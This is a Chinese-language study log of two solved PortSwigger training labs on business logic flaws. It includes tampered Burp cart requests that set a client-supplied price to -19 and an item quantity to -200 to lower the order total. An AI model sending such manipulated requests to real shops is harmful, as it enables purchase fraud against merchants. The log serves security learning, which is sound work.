# Day3: PortSwigger 业务逻辑 Lab1 & Lab2 通关记录

## 通关状态
- Lab 1: Excessive trust in client-side controls (Apprentice) - Solved
- Lab 2: High-level logic vulnerability (Apprentice) - Solved

## Lab 1：修改价格
**漏洞原理**：后端完全信任前端传入的 price 参数。
**Burp 请求原文（POST /cart）**：
POST /cart HTTP/2
Host: 0af200780343d0ac80be35b0001600ec.web-security-academy.net
...
productId=1&redir=PRODUCT&quantity=1&price=-19

## Lab 2：修改数量
**漏洞原理**：购物车总价计算逻辑有缺陷，修改第二个商品的数量为负数，可抵消总价。
**Burp 请求原文（POST /cart）**：
POST /cart HTTP/2
Host: 0a01006a0346e7d380cb265b002600b9.web-security-academy.net
...
productId=2&redir=PRODUCT&quantity=-200

## 卡点与心得
- Lab 1：直接改负数价格商品会消失，说明前端/后端有过滤，但改成正数金额是可以过关的。
- Lab 2：加两个商品，改第二个的数量为负数，利用总价逻辑缺陷直接压低总价。
- 结论：业务逻辑漏洞的核心是“后端不信任前端”，任何涉及到计算（价格、数量、折扣）的参数都是重点测试对象。
